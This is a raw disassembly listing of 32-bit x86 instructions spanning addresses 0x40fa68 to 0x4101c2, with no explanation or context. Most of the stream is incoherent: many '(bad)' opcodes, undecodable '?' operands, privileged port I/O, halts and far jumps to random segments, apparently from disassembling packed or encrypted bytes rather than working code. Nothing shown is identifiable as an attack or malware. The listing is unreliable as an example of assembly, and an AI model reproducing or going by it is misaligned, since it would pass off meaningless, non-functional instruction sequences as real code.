  40fa68:	adc    eax,esi
  40fa6a:	xchg   BYTE PTR [edx+0x4ec5a0e0],dl
  40fa70:	fidiv  DWORD PTR [ebx]
  40fa72:	mov    dl,0x65
  40fa74:	xlat   BYTE PTR ds:[ebx]
  40fa75:	sbb    ch,BYTE PTR [esi]
  40fa77:	pop    ecx
  40fa78:	sbb    DWORD PTR [edi],eax
  40fa7a:	into   
  40fa7b:	shl    DWORD PTR [esp+esi*1],1
  40fa7e:	xor    ebp,esi
  40fa80:	mov    ebp,0xdc8a2616
  40fa85:	scas   al,BYTE PTR es:[edi]
  40fa86:	dec    eax
  40fa87:	in     eax,dx
  40fa88:	lahf   
  40fa89:	aad    0x66
  40fa8b:	ss mov al,0xca
  40fa8e:	out    dx,al
  40fa8f:	cld    
  40fa90:	dec    ebp
  40fa91:	mov    ds:0x876162d3,al
  40fa96:	pop    ss
  40fa97:	dec    eax
  40fa98:	xchg   ebp,eax
  40fa99:	dec    edi
  40fa9a:	daa    
  40fa9b:	and    bh,BYTE PTR [ebp+0x32]
  40fa9e:	mov    bl,0x28
  40faa0:	cmp    eax,0x678acd91
  40faa5:	pop    edi
  40faa6:	dec    eax
  40faa7:	fnstcw WORD PTR [ebp+ebp*1+0x4c0057e]
  40faae:	nop
  40faaf:	adc    ah,BYTE PTR [eax+0x33]
  40fab2:	cmp    DWORD PTR ds:0xeaeec2b7,esp
  40fab8:	pushw  cs
  40faba:	rol    BYTE PTR [edi+0x26bae36b],cl
  40fac0:	out    dx,eax
  40fac1:	out    dx,al
  40fac2:	inc    ecx
  40fac3:	test   BYTE PTR [ebx+0x27059e6e],bh
  40fac9:	out    dx,al
  40faca:	daa    
  40facb:	adc    DWORD PTR [esp+edi*4+0xd],0x948b02ba
  40fad3:	ds inc ecx
  40fad5:	repnz scas al,BYTE PTR es:[edi]
  40fad7:	pop    edi
  40fad8:	cwde   
  40fad9:	fmulp  st(7),st
  40fadb:	push   ebp
  40fadc:	fsubr  QWORD PTR [ebx+0xd]
  40fadf:	mov    eax,0xfe211deb
  40fae4:	pop    ebp
  40fae5:	outs   dx,BYTE PTR ds:[esi]
  40fae6:	and    eax,0x39124aaa
  40faeb:	imul   esi,DWORD PTR [ebx+0x1a9afcb5],0x8be98615
  40faf5:	shl    DWORD PTR [ecx],0xc6
  40faf8:	(bad)  
  40faf9:	jecxz  0x40fab6
  40fafb:	daa    
  40fafc:	xlat   BYTE PTR ds:[ebx]
  40fafd:	pop    eax
  40fafe:	ficomp WORD PTR [eax]
  40fb00:	jmp    0xd753:0x6d929272
  40fb07:	pop    ecx
  40fb08:	pop    esp
  40fb09:	pop    DWORD PTR [ecx+ebp*8]
  40fb0c:	inc    ecx
  40fb0d:	inc    edx
  40fb0e:	lock mov bl,0x5d
  40fb11:	sub    BYTE PTR [ebx+0x1a],0xbf
  40fb15:	test   DWORD PTR [esi-0x7f],0x8967c2bf
  40fb1c:	dec    eax
  40fb1d:	add    BYTE PTR [ecx+0x330e552e],ah
  40fb23:	xchg   esp,eax
  40fb24:	aam    0x58
  40fb26:	pusha  
  40fb27:	and    esp,esp
  40fb29:	mov    ah,0x95
  40fb2b:	jo     0x40fb43
  40fb2d:	jl     0x40fb03
  40fb2f:	adc    edx,eax
  40fb31:	hlt    
  40fb32:	fild   WORD PTR ds:0x7afd67ff
  40fb38:	xor    al,0x99
  40fb3a:	test   eax,0x1106d5b6
  40fb3f:	cmc    
  40fb40:	pop    esp
  40fb41:	sti    
  40fb42:	xchg   ecx,eax
  40fb43:	dec    edi
  40fb44:	jmp    FWORD PTR [eax]
  40fb46:	xchg   edx,eax
  40fb47:	mov    DWORD PTR [esi],ebp
  40fb49:	popf   
  40fb4a:	xor    eax,0x5e8d5fbc
  40fb4f:	push   ecx
  40fb50:	mov    WORD PTR [edi],ds
  40fb52:	out    dx,eax
  40fb53:	out    dx,eax
  40fb54:	aam    0x93
  40fb56:	(bad)  
  40fb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb58:	push   es
  40fb59:	pushf  
  40fb5a:	mov    edi,0xf928d2b
  40fb5f:	inc    esp
  40fb60:	push   eax
  40fb61:	mov    cl,0x5c
  40fb63:	out    dx,eax
  40fb64:	aaa    
  40fb65:	ja     0x40fbce
  40fb67:	mov    ah,BYTE PTR [esi+eiz*4]
  40fb6a:	push   es
  40fb6b:	mov    cl,0x1b
  40fb6d:	ds das 
  40fb6f:	je     0x40fb46
  40fb71:	sub    ecx,DWORD PTR [edx-0x16]
  40fb74:	in     al,0x2d
  40fb76:	out    dx,eax
  40fb77:	adc    ebp,DWORD PTR [ebp-0x39169f79]
  40fb7d:	mov    WORD PTR [ecx-0x5d],cs
  40fb80:	adc    BYTE PTR [ecx+0x22d00334],ah
  40fb86:	mov    esi,0x265fdf09
  40fb8b:	jg     0x40fb62
  40fb8d:	jmp    FWORD PTR [esp+edi*8]
  40fb90:	jmp    0x40fb54
  40fb92:	pop    ebp
  40fb93:	imul   edx,DWORD PTR [esi],0xcbb1f7f1
  40fb99:	xor    dl,dh
  40fb9b:	into   
  40fb9c:	pop    edi
  40fb9d:	out    dx,al
  40fb9e:	or     ah,BYTE PTR [ecx-0x7e]
  40fba1:	and    cl,BYTE PTR [edi]
  40fba3:	xchg   BYTE PTR [ecx-0x7],bh
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffc0
  40fbc9:	sbb    bh,BYTE PTR [eax+0x7eb6d08e]
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fc2a
  40fbd5:	mov    cl,0xf1
  40fbd7:	add    edi,DWORD PTR [ebp-0x5686bc01]
  40fbdd:	(bad)  
  40fbde:	ins    DWORD PTR es:[edi],dx
  40fbdf:	sub    eax,0x5668a78e
  40fbe4:	stos   DWORD PTR es:[edi],eax
  40fbe5:	cdq    
  40fbe6:	xchg   esi,eax
  40fbe7:	psubw  mm4,mm0
  40fbea:	shl    BYTE PTR [edi],cl
  40fbec:	or     ch,BYTE PTR [ebx-0x18]
  40fbef:	cli    
  40fbf0:	xor    ecx,DWORD PTR [ebx+0xe]
  40fbf3:	inc    esp
  40fbf4:	test   al,0x8f
  40fbf6:	push   ss
  40fbf7:	lds    esi,FWORD PTR [ebx]
  40fbf9:	mul    DWORD PTR [ecx]
  40fbfb:	add    bh,BYTE PTR [eax]
  40fbfd:	out    dx,eax
  40fbfe:	mov    al,ds:0x106e5a86
  40fc03:	mov    BYTE PTR [edx-0x9],ah
  40fc06:	hlt    
  40fc07:	sub    DWORD PTR [ecx-0x54],0x1a
  40fc0b:	retf   0x203f
  40fc0e:	scas   al,BYTE PTR es:[edi]
  40fc0f:	in     al,0x4a
  40fc11:	clc    
  40fc12:	pop    es
  40fc13:	push   esi
  40fc14:	sbb    al,0x46
  40fc16:	adc    al,0x17
  40fc18:	cmp    eax,esp
  40fc1a:	inc    edx
  40fc1b:	arpl   WORD PTR [ecx-0x5],cx
  40fc1e:	and    eax,0x1f665c9f
  40fc23:	sbb    DWORD PTR [ebx+0x4e57382d],edi
  40fc29:	aam    0xc6
  40fc2b:	or     BYTE PTR [edx-0x50],0x2b
  40fc2f:	mov    ds:0x62cf6de5,eax
  40fc34:	call   0x8e7fec40
  40fc39:	push   esp
  40fc3a:	imul   ebx,DWORD PTR [ebx],0xffffffce
  40fc3d:	dec    ebx
  40fc3e:	lea    eax,[eax]
  40fc40:	(bad)  
  40fc42:	xchg   esp,eax
  40fc43:	test   DWORD PTR [edx-0x40952faa],esp
  40fc49:	inc    ebp
  40fc4a:	mov    esp,esp
  40fc4c:	loop   0x40fbe5
  40fc4e:	leave  
  40fc4f:	mov    fs,WORD PTR [ebp+0x72]
  40fc52:	lods   al,BYTE PTR ds:[esi]
  40fc53:	and    esp,DWORD PTR [ebp+edx*1+0xd7607b5]
  40fc5a:	hlt    
  40fc5b:	sbb    bh,BYTE PTR [edi-0x23]
  40fc5e:	dec    ebp
  40fc5f:	inc    edi
  40fc60:	out    0xe3,al
  40fc62:	retf   0x96ec
  40fc65:	jmp    0x45761ef8
  40fc6a:	xchg   DWORD PTR [edi+edi*1],edx
  40fc6d:	jg     0x40fc00
  40fc6f:	mov    dh,bh
  40fc71:	inc    eax
  40fc72:	jg     0x40fc56
  40fc74:	nop
  40fc75:	fucomi st,st(0)
  40fc77:	inc    eax
  40fc78:	mov    ch,0x38
  40fc7a:	(bad)  
  40fc7b:	jg     0x40fcd9
  40fc7d:	pop    esp
  40fc7e:	mov    eax,ds:0x1d037676
  40fc83:	push   cs
  40fc84:	xor    BYTE PTR [eax-0xa],bh
  40fc87:	cmp    BYTE PTR [edi+0x670bcdc0],ch
  40fc8d:	xlat   BYTE PTR ds:[ebx]
  40fc8e:	test   al,0xd
  40fc90:	dec    ebx
  40fc91:	jl     0x40fcfc
  40fc93:	imul   ebx,DWORD PTR [ecx-0x25],0xffffffe5
  40fc97:	iret   
  40fc98:	xchg   edi,eax
  40fc99:	in     eax,dx
  40fc9a:	leave  
  40fc9b:	dec    ecx
  40fc9c:	in     eax,dx
  40fc9d:	jmp    0xb4766e45
  40fca2:	push   eax
  40fca3:	lock pop ecx
  40fca5:	cmp    al,0x86
  40fca7:	mov    WORD PTR [ecx+0x3e],?
  40fcaa:	add    eax,0xf497ae75
  40fcaf:	shl    DWORD PTR ds:0xa2a10607,cl
  40fcb5:	xchg   edi,eax
  40fcb6:	inc    ecx
  40fcb7:	retf   
  40fcb8:	dec    edx
  40fcb9:	std    
  40fcba:	imul   eax,eax,0xeb43a206
  40fcc0:	xor    al,0x17
  40fcc2:	xchg   DWORD PTR [ebx-0x24],edi
  40fcc5:	cmp    cl,BYTE PTR [esi]
  40fcc7:	sbb    dh,bh
  40fcc9:	pop    edi
  40fcca:	push   eax
  40fccb:	ja     0x40fc5d
  40fccd:	inc    ebp
  40fcce:	int    0xdf
  40fcd0:	fild   WORD PTR [edx]
  40fcd2:	aas    
  40fcd3:	scas   eax,DWORD PTR es:[edi]
  40fcd4:	push   esi
  40fcd5:	xor    BYTE PTR [ecx],ch
  40fcd7:	push   0xffffffcf
  40fcd9:	dec    ebp
  40fcda:	ja     0x40fca6
  40fcdc:	jne    0x40fcee
  40fcde:	inc    eax
  40fcdf:	and    DWORD PTR ds:0x1f6f0338,edi
  40fce5:	mov    bh,0xee
  40fce7:	xchg   edx,eax
  40fce8:	dec    esi
  40fce9:	add    al,0x8e
  40fceb:	or     BYTE PTR [edi-0x3e],dh
  40fcee:	loop   0x40fd21
  40fcf0:	mov    ds:0xc8066213,eax
  40fcf5:	push   0xffffffa1
  40fcf7:	pop    ecx
  40fcf8:	call   0x36bdaaa6
  40fcfd:	call   0x14a9f1ff
  40fd02:	mov    edx,0x9f8b80ff
  40fd07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd08:	xchg   DWORD PTR [ecx],ebp
  40fd0a:	mov    dh,0x52
  40fd0c:	mov    ebx,0xf425d0dc
  40fd11:	int3   
  40fd12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd13:	mov    bh,0x7c
  40fd15:	ffreep st(0)
  40fd17:	or     esi,esp
  40fd19:	(bad)  
  40fd1a:	jecxz  0x40fd59
  40fd1c:	pop    ebx
  40fd1d:	cmp    al,0x9c
  40fd1f:	sub    esp,edx
  40fd21:	pop    esi
  40fd22:	and    ecx,DWORD PTR [esp+esi*4-0x57]
  40fd26:	jle    0x40fcbf
  40fd28:	xchg   esp,eax
  40fd29:	cmp    eax,eax
  40fd2b:	adc    eax,0x3ffd8367
  40fd30:	mov    ch,0x8d
  40fd32:	out    0x94,eax
  40fd34:	(bad)  
  40fd35:	loopne 0x40fdac
  40fd37:	mov    bh,0xd
  40fd39:	push   ds
  40fd3a:	and    eax,DWORD PTR [edx-0x4e]
  40fd3d:	stos   BYTE PTR es:[edi],al
  40fd3e:	out    dx,al
  40fd3f:	test   edi,edx
  40fd41:	mov    dl,0x83
  40fd43:	lods   al,BYTE PTR ds:[esi]
  40fd44:	fcmovb st,st(0)
  40fd46:	and    BYTE PTR [eax],dh
  40fd48:	pop    ds
  40fd49:	(bad)  
  40fd4b:	outs   dx,BYTE PTR ds:[esi]
  40fd4c:	inc    eax
  40fd4d:	shl    DWORD PTR fs:[ecx+0x49],1
  40fd51:	sti    
  40fd52:	imul   esi,esi,0x47
  40fd55:	jae    0x40fd9d
  40fd57:	jbe    0x40fd4e
  40fd59:	mul    DWORD PTR [esi+ebp*8+0x43aee54a]
  40fd60:	xchg   DWORD PTR [ebx],ecx
  40fd62:	or     al,0x6a
  40fd64:	nop
  40fd65:	sar    BYTE PTR [ebx+edi*1-0x3b],1
  40fd69:	or     bl,BYTE PTR [ebx]
  40fd6b:	jecxz  0x40fd85
  40fd6d:	adc    dl,BYTE PTR [esp+ebx*4]
  40fd70:	xor    DWORD PTR [ebx+0x32],0xffffffb1
  40fd74:	jno    0x40fdd3
  40fd76:	mov    eax,0x8a1d71ec
  40fd7b:	mov    ebp,0x2474a1cd
  40fd80:	cmp    edx,ecx
  40fd82:	enter  0xf9e1,0x81
  40fd86:	ja     0x40fd39
  40fd88:	sar    edx,1
  40fd8a:	popw   es
  40fd8c:	retf   
  40fd8d:	pop    ebp
  40fd8e:	ds jl  0x40fd68
  40fd91:	mov    dl,dh
  40fd93:	(bad)  
  40fd94:	icebp  
  40fd95:	jo     0x40fd27
  40fd97:	mov    ebx,0xe7493822
  40fd9c:	and    al,0x55
  40fd9e:	sbb    DWORD PTR [edi+0x3a],edi
  40fda1:	pushf  
  40fda2:	add    eax,DWORD PTR [ebx-0x2b41f4e8]
  40fda8:	adc    eax,0x3c79c4a3
  40fdad:	iret   
  40fdae:	mov    ch,0xb0
  40fdb0:	adc    ecx,DWORD PTR [edi-0x48]
  40fdb3:	jne    0x40fe27
  40fdb5:	sbb    bl,BYTE PTR [ebx+0x168e966b]
  40fdbb:	inc    eax
  40fdbc:	sbb    cl,BYTE PTR [esi-0x78]
  40fdbf:	fcmovne st,st(5)
  40fdc1:	mov    ch,0x47
  40fdc3:	push   edx
  40fdc4:	and    edx,DWORD PTR [ebx+0x771b6567]
  40fdca:	xchg   DWORD PTR [edx+0x7aa15bb5],ebp
  40fdd0:	push   ds
  40fdd1:	mov    bl,0x5e
  40fdd3:	(bad)  
  40fdd4:	call   0x3d37:0x7dbf572
  40fddb:	xchg   ebp,eax
  40fddc:	xchg   DWORD PTR [ecx-0x77],edx
  40fddf:	cli    
  40fde0:	call   0x5177:0x81236cc5
  40fde7:	(bad)  
  40fde8:	cmp    dh,bl
  40fdea:	and    al,0xa2
  40fdec:	mov    edi,0x582617af
  40fdf1:	push   esp
  40fdf2:	sahf   
  40fdf3:	pop    ebp
  40fdf4:	les    esi,FWORD PTR [eax+0x6f3701be]
  40fdfa:	push   eax
  40fdfb:	push   esp
  40fdfc:	sub    al,0xab
  40fdfe:	mov    BYTE PTR es:[ebp-0x7d],dl
  40fe02:	popa   
  40fe03:	xchg   edi,eax
  40fe04:	(bad)  
  40fe05:	icebp  
  40fe06:	add    eax,0x46f5222c
  40fe0b:	int    0xce
  40fe0d:	arpl   WORD PTR [ebx],dx
  40fe0f:	push   ebx
  40fe10:	sti    
  40fe11:	push   eax
  40fe12:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40fe14:	imul   ebp,DWORD PTR [edi],0x8fa4c29b
  40fe1a:	mov    ds,esi
  40fe1c:	push   ebp
  40fe1d:	push   edi
  40fe1e:	and    edi,DWORD PTR ds:0x609ec985
  40fe24:	jne    0x40fdab
  40fe26:	imul   edx,esp,0xffffffcd
  40fe29:	daa    
  40fe2a:	loopne 0x40fdd5
  40fe2c:	jg     0x40fe7b
  40fe2e:	aad    0xe9
  40fe30:	cli    
  40fe31:	xor    al,cl
  40fe33:	push   DWORD PTR [edi+eiz*2]
  40fe36:	enter  0x11d7,0xef
  40fe3a:	mov    cs,WORD PTR [edx]
  40fe3c:	bt     DWORD PTR [edi],0xcb
  40fe40:	shr    BYTE PTR [edx],0xb1
  40fe43:	cli    
  40fe44:	ins    DWORD PTR es:[edi],dx
  40fe45:	ja     0x40fdda
  40fe47:	shr    esp,cl
  40fe49:	mov    bh,0x75
  40fe4b:	mov    esp,0x67cce4db
  40fe50:	pop    ds
  40fe51:	int3   
  40fe52:	dec    esi
  40fe53:	int    0xe
  40fe55:	nop
  40fe56:	bound  ebx,QWORD PTR ds:[edi-0x5d]
  40fe5a:	push   esp
  40fe5b:	pop    ecx
  40fe5c:	pop    esi
  40fe5d:	inc    eax
  40fe5e:	push   edx
  40fe5f:	les    eax,FWORD PTR [edi]
  40fe61:	push   0xffffff95
  40fe63:	push   edi
  40fe64:	cmp    ebp,ebp
  40fe66:	push   0xffffffa8
  40fe68:	add    al,0x67
  40fe6a:	xor    eax,0x76a24f29
  40fe6f:	nop
  40fe70:	icebp  
  40fe71:	aad    0xb7
  40fe73:	mov    BYTE PTR [esi-0x5e],cl
  40fe76:	sahf   
  40fe77:	dec    eax
  40fe78:	lock popa 
  40fe7a:	mov    ch,0x33
  40fe7c:	(bad)  
  40fe7d:	pop    ecx
  40fe7e:	mov    DWORD PTR [ecx+0x35],edx
  40fe81:	xchg   edx,eax
  40fe82:	inc    edi
  40fe83:	jp     0x40fe0e
  40fe85:	or     DWORD PTR [edx-0x534e944b],edx
  40fe8b:	and    ebx,DWORD PTR es:[ecx+0x19]
  40fe8f:	in     al,dx
  40fe90:	add    BYTE PTR [eax-0x1d4986d],bh
  40fe96:	jg     0x40fe43
  40fe98:	out    dx,eax
  40fe99:	pop    ebx
  40fe9a:	jns    0x40feaf
  40fe9c:	in     al,0x1d
  40fe9e:	jmp    0x6897:0x8b7dc223
  40fea5:	or     eax,0x8aee8106
  40feaa:	pop    esi
  40feab:	add    ecx,DWORD PTR [edx+0x4a740ce6]
  40feb1:	in     eax,0xc3
  40feb3:	ss mov ebx,0xef9449b3
  40feb9:	(bad)  
  40feba:	sti    
  40febb:	ins    DWORD PTR es:[edi],dx
  40febc:	outs   dx,BYTE PTR ds:[esi]
  40febd:	pop    ebp
  40febe:	cmp    ecx,edi
  40fec0:	mov    al,ds:0xb2d43a73
  40fec5:	xchg   DWORD PTR [ebx+0x26],ebp
  40fec8:	sbb    BYTE PTR [ebx+0x70692527],0x77
  40fecf:	mov    edi,0x1f539dcd
  40fed4:	rcl    BYTE PTR ds:0x330c458b,1
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x8e0f4346
  40fef3:	pop    ss
  40fef4:	jp     0x40fed4
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40fedc
  40fefe:	ja     0x40ff6c
  40ff00:	aad    0x77
  40ff02:	xchg   esi,eax
  40ff03:	inc    edi
  40ff04:	add    al,0xe7
  40ff06:	not    DWORD PTR [ebx]
  40ff08:	xchg   bl,ah
  40ff0a:	cdq    
  40ff0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff0c:	sahf   
  40ff0d:	loope  0x40ff1f
  40ff0f:	adc    DWORD PTR [eax+0x63],ebp
  40ff12:	les    eax,FWORD PTR [ebp-0x5]
  40ff15:	fcom   DWORD PTR [ebx]
  40ff17:	(bad)  
  40ff18:	jbe    0x40ff86
  40ff1a:	mov    eax,0x7db531a3
  40ff1f:	in     al,dx
  40ff20:	xchg   DWORD PTR [edi+0x284e6eb3],esp
  40ff26:	ja     0x40ff22
  40ff28:	jbe    0x40ffa6
  40ff2a:	out    dx,al
  40ff2b:	sub    eax,0xea54c70b
  40ff30:	dec    esp
  40ff31:	std    
  40ff32:	xor    DWORD PTR [ecx+0xd],0xffffffc5
  40ff36:	cmp    ah,BYTE PTR [esi]
  40ff38:	sahf   
  40ff39:	mov    eax,ds:0xcbc65952
  40ff3e:	mov    al,0x2
  40ff40:	add    al,ah
  40ff42:	or     eax,0x4eda4e36
  40ff47:	aaa    
  40ff48:	mov    dh,dl
  40ff4a:	out    dx,eax
  40ff4b:	sub    ah,BYTE PTR [ebx+0x6c]
  40ff4e:	mov    edx,0xc031a072
  40ff53:	arpl   si,bp
  40ff55:	dec    esi
  40ff56:	dec    ecx
  40ff57:	sbb    BYTE PTR [ecx+eiz*1],dl
  40ff5a:	inc    ebp
  40ff5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff5c:	fld    st(1)
  40ff5e:	popa   
  40ff5f:	retf   0xc1eb
  40ff62:	arpl   WORD PTR [eax+0x4dfed11b],dx
  40ff68:	xchg   DWORD PTR [ecx],ecx
  40ff6a:	jge    0x40ff09
  40ff6c:	add    al,dl
  40ff6e:	popf   
  40ff6f:	xor    BYTE PTR [ebp+0x29103dcf],0x76
  40ff76:	jne    0x40ff8a
  40ff78:	and    cl,BYTE PTR [ebx+0x2b41cf77]
  40ff7e:	jecxz  0x40ffff
  40ff80:	fsubp  st(5),st
  40ff82:	lods   eax,DWORD PTR ds:[esi]
  40ff83:	sub    BYTE PTR [edi],dl
  40ff85:	jae    0x40ff2d
  40ff87:	rcr    BYTE PTR [eax-0x44],0x5a
  40ff8b:	add    al,0x1
  40ff8d:	mov    ?,ecx
  40ff8f:	es pop ss
  40ff91:	lock call 0x40b15db8
  40ff97:	dec    ebx
  40ff98:	js     0x40ff31
  40ff9a:	dec    ecx
  40ff9b:	ret    
  40ff9c:	mov    al,0x35
  40ff9e:	push   eax
  40ff9f:	(bad)  
  40ffa0:	or     DWORD PTR [edi-0x48],ebx
  40ffa3:	bswap  eax
  40ffa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffa6:	or     DWORD PTR [edx+0x7c81a012],esp
  40ffac:	cmp    BYTE PTR [ebx+0x17b8cf1],ch
  40ffb2:	enter  0x10a8,0x9b
  40ffb6:	dec    esp
  40ffb7:	xlat   BYTE PTR ds:[ebx]
  40ffb8:	fld    DWORD PTR [bx+si+0x2ec4]
  40ffbd:	ins    BYTE PTR es:[edi],dx
  40ffbe:	loope  0x40ffda
  40ffc0:	sub    eax,0x1f9c824e
  40ffc5:	sbb    eax,0x316d5b1b
  40ffca:	adc    eax,DWORD PTR [ecx+0x2f1c9ba]
  40ffd0:	jbe    0x40fffa
  40ffd2:	cld    
  40ffd3:	pop    es
  40ffd4:	dec    edx
  40ffd5:	push   cs
  40ffd6:	xchg   edi,eax
  40ffd7:	dec    ebp
  40ffd8:	mov    esi,0x37b69e6e
  40ffdd:	cwde   
  40ffde:	cld    
  40ffdf:	addr16 in eax,0x44
  40ffe2:	ins    DWORD PTR es:[edi],dx
  40ffe3:	popf   
  40ffe4:	add    edx,0x9ae8af0d
  40ffea:	add    BYTE PTR [edx+0x68],cl
  40ffed:	mov    ah,0x4d
  40ffef:	pop    es
  40fff0:	jle    0x41003c
  40fff2:	push   0x759b168a
  40fff7:	adc    esp,DWORD PTR [ebx+ecx*2]
  40fffa:	push   ebx
  40fffb:	inc    ebx
  40fffc:	sar    DWORD PTR [ebx],1
  40fffe:	dec    ecx
  40ffff:	popa   
  410000:	pop    esi
  410001:	add    eax,0xfdf890fb
  410006:	xchg   ebp,eax
  410007:	rcl    DWORD PTR [esi],cl
  410009:	xchg   edi,eax
  41000a:	jae    0x41003f
  41000c:	sbb    DWORD PTR [edx-0x1a],edi
  41000f:	adc    al,0xf7
  410011:	fisub  DWORD PTR [ebx-0x70]
  410014:	in     al,dx
  410015:	add    eax,DWORD PTR [eax-0x7d598b3f]
  41001b:	mov    ds:0x957f7e48,al
  410020:	jmp    0xe5d7aba6
  410025:	(bad)  
  410026:	jmp    0xcaf444a0
  41002b:	sbb    esi,edi
  41002d:	xchg   esi,eax
  41002e:	pop    ebx
  41002f:	pop    edx
  410030:	bound  esi,QWORD PTR [edi]
  410032:	push   cs
  410033:	jmp    0x40ffde
  410035:	in     eax,dx
  410036:	not    eax
  410038:	adc    eax,0x13e0ee6f
  41003d:	mov    bl,0x88
  41003f:	das    
  410040:	inc    edx
  410041:	mov    edi,0x4a9cd104
  410046:	mov    esp,0x59950798
  41004b:	ret    0x6512
  41004e:	mov    ecx,0xbeec3c7f
  410053:	in     eax,0xd
  410055:	call   0x71ed:0xfa477c1
  41005c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41005d:	xchg   ecx,eax
  41005e:	fistp  DWORD PTR [edx-0x6d]
  410061:	outs   dx,BYTE PTR ds:[esi]
  410062:	mov    esp,0x507d2ce2
  410067:	jns    0x41002b
  410069:	mov    bl,BYTE PTR [esi+0x233e61d6]
  41006f:	and    al,0x69
  410071:	sub    DWORD PTR cs:[edx],ebx
  410074:	xor    eax,0x4dfe647b
  410079:	fisttp WORD PTR [esi+ebx*2-0x5a662aef]
  410080:	leave  
  410081:	dec    ebx
  410082:	adc    DWORD PTR [edx+0x4b],edx
  410085:	push   0xffffffc8
  410087:	inc    esi
  410088:	xchg   DWORD PTR [ecx-0x518be18b],ebx
  41008e:	pop    ss
  41008f:	popf   
  410090:	retf   0x35e6
  410093:	and    dl,cl
  410095:	call   0x5dce9eb3
  41009a:	sub    BYTE PTR [ebx+0x9],ch
  41009d:	(bad)  
  41009e:	in     al,dx
  41009f:	outs   dx,DWORD PTR ds:[esi]
  4100a0:	ret    0x6673
  4100a3:	jmp    0xa0ee:0x902cc1d6
  4100aa:	cs jns 0x410118
  4100ad:	aas    
  4100ae:	repz and BYTE PTR [eax-0x2a],cl
  4100b2:	into   
  4100b3:	adc    BYTE PTR [esi-0x73],bh
  4100b6:	jae    0x4100fc
  4100b8:	enter  0xc171,0x48
  4100bc:	rcr    BYTE PTR [ebp+0x19],0x13
  4100c0:	ja     0x410092
  4100c2:	xor    al,0x33
  4100c4:	dec    DWORD PTR [esi+edi*1+0x24]
  4100c8:	or     eax,DWORD PTR [eax-0x4a]
  4100cb:	xor    BYTE PTR [esi+0xaed05d2],0xe
  4100d2:	dec    esp
  4100d3:	push   esi
  4100d4:	inc    ebx
  4100d5:	xchg   edx,eax
  4100d6:	jl     0x410077
  4100d8:	xchg   ebx,eax
  4100d9:	xchg   BYTE PTR [ebp-0x66],dh
  4100dc:	scas   al,BYTE PTR es:[edi]
  4100dd:	loopne 0x4100f9
  4100df:	icebp  
  4100e0:	movzx  edi,WORD PTR [ecx+edx*2-0x20]
  4100e5:	not    edi
  4100e7:	retf   0x8f28
  4100ea:	les    ecx,FWORD PTR [edx]
  4100ec:	mov    ebp,0x8c542fd5
  4100f1:	xor    ecx,0xffffffd4
  4100f4:	or     al,0xe
  4100f6:	push   0x179d6447
  4100fb:	jmp    0x52182f34
  410100:	jno    0x410107
  410102:	push   ebx
  410103:	cdq    
  410104:	add    DWORD PTR [ebx+0x33a466aa],esi
  41010a:	xchg   edi,eax
  41010b:	cwde   
  41010c:	(bad)  [edx-0x4bd08828]
  410112:	ja     0x41015a
  410114:	dec    esi
  410115:	jb     0x410105
  410117:	or     DWORD PTR [ebx-0x4e783edc],esp
  41011d:	rol    bl,0xdf
  410120:	imul   eax,DWORD PTR [esi+esi*2+0x6766ce97],0xffffffbf
  410128:	fld    QWORD PTR [edx+0x38]
  41012b:	lahf   
  41012c:	(bad)  
  41012d:	imul   BYTE PTR [esi+0x8]
  410130:	enter  0x9804,0x3a
  410134:	and    ecx,edx
  410136:	das    
  410137:	out    0x5c,al
  410139:	popf   
  41013a:	xchg   edx,eax
  41013b:	pop    ebx
  41013c:	mov    ebx,0xad3714ab
  410141:	sub    eax,0x2af19158
  410146:	imul   ecx,DWORD PTR [edx-0x64],0xd4dcb760
  41014d:	or     al,dl
  41014f:	aad    0x27
  410151:	into   
  410152:	int3   
  410153:	mov    cs:0x130a9756,al
  410159:	xor    ecx,esp
  41015b:	lock jbe 0x41015d
  41015e:	jnp    0x410186
  410160:	aaa    
  410161:	mov    edi,0xb193191a
  410166:	ret    0x3795
  410169:	cmp    esi,DWORD PTR [edi+esi*1-0x3f7fe10e]
  410170:	mov    ?,WORD PTR [ecx+0x69e993b]
  410176:	test   DWORD PTR [edi],ebp
  410178:	popa   
  410179:	call   0x97792e5d
  41017e:	inc    edx
  41017f:	push   ebp
  410180:	dec    eax
  410181:	sub    edi,DWORD PTR [eax+0x2cc5d763]
  410187:	mov    ebp,0x45a53b20
  41018c:	mov    ecx,0x299b2fc4
  410191:	loop   0x41018a
  410193:	jmp    0x6813:0x5ad462f6
  41019a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019b:	push   ebx
  41019c:	das    
  41019d:	ins    DWORD PTR es:[edi],dx
  41019e:	pop    ebx
  41019f:	fs pop ds
  4101a1:	call   0xfd013912
  4101a6:	mov    cl,0x30
  4101a8:	mov    edi,0x470fc6ec
  4101ad:	add    al,0x67
  4101af:	cld    
  4101b0:	dec    eax
  4101b1:	xchg   ebp,eax
  4101b2:	into   
  4101b3:	sub    BYTE PTR [eax+0x1b6d95a6],dh
  4101b9:	push   ebx
  4101ba:	or     edx,edi
  4101bc:	jb     0x410194
  4101be:	fsub   st,st(1)
  4101c0:	adc    edx,ecx
  4101c2:	imul   ebx,DWORD PTR [ecx],0xb55acd17
